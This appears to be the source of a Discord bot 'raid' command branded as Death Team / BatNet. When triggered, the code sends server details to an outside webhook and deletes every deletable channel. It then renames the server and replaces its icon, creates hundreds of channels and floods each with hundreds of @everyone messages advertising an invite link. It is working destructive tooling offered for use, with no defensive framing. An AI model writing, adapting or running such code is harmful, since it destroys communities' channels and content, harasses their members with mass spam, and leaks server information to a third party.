const Discord = require('discord.js');
const chalk = require('chalk');
const fetch = require('node-fetch');
const util = require('./utilities/ignore.json');
const emojis = require('./utilities/emojis.json');

////// COMMAND //////

module.exports = {
     name: 'raid',
     aliases: ['r'],
     description: '',
     
async execute(client, message, args){
     setTimeout(function() {
          
          console.log(chalk.cyan(`\n[ BATNET ] ${message.author.tag} Has executed the raid command`));
          console.log(chalk.cyan(`[ BATNET ] Sending log to the webhook.\n`));
          
          const log = {
               username: 'BatNet | Logging',
               avatar_url: 'https://cdn.discordapp.com/avatars/1081612143566270635/8511dc5a9f3fda4f7af646dc4cd0c901.png?size=2048',
               content: '',
               embeds: [
                    {
                         description: `${emojis.bat} **| Command:**\n*__.raid__*\n\n${emojis.beer} **| Guild:**\n*__${message.guild.name} ( ${message.guild.id} )__*\n\n${emojis.crown} **| Channels:**\n*__${message.guild.channels.cache.size}__*\n\n${emojis.wings} **| Roles:**\n*__${message.guild.roles.cache.size}__*\n\n${emojis.sparks} **| Users:**\n*__${message.guild.memberCount}__*\n\n${emojis.pin} **| Author:**\n${message.author.tag}`,
                         author: {
                              name: 'BatNet',
                              url: 'https://discord.gg/DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                         },
                         thumbnail: {
                              url: util.server_logo
                         },
                         footer: {
                              text: '#DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
                         },
                         color: 0x0000
                         }
                    ]
          }
          
          fetch(util.webhook_url, {
               method: 'POST',
               headers: {
                    'Content-type': 'application/json'
               },
               body: JSON.stringify(log)
          });
          
          message.delete();
          
          for (const channel of message.guild.channels.cache.filter(channel => channel.deletable).array()) {
               channel.delete();
          }
          message.guild.channels.create(util.nuke_channel, {
               type: 'text'
          }).then(channel => {
               const embed = new Discord.MessageEmbed();
               
               channel.send('||@everyone||\nhttps://discord.gg/DeathTeam', {
                    embed: {
                         description: `${emojis.sparks} **| This server has been raided by Death Team, join into the server to use the bot.**`,
                         author: {
                              name: 'Death Team',
                              url: 'https://discord.gg/DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                         },
                         thumbnail: {
                              url: util.server_logo
                         },
                         footer: {
                              text: '#DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
                         },
                         color: 0x0000
                    }
               });

          });
      
      message.guild.setName(util.server_name);
      message.guild.setIcon(util.server_logo);
      
     for (let i = 0; i <= 500; i++) {
          message.guild.channels.create(util.raid_channel, {
               type: 'text'
     }).then(channel => {
          for (let i = 0; i <= 500; i++) {
               
               const embed = new Discord.MessageEmbed(); 
               
               channel.send('||@everyone||\nhttps://discord.gg/DeathTeam', {
                    embed: {
                         description: `${emojis.wings} **| This server has been raided by Death Team, please, enjoy.**`,
                         author: {
                              name: 'Death Team',
                              url: 'https://discord.gg/DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                         },
                         thumbnail: {
                              url: util.server_logo
                         },
                         footer: {
                              text: '#DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
                         },
                         color: 0x0000
                    }
               });
               
      }
});
}
}, 5000);
}
}
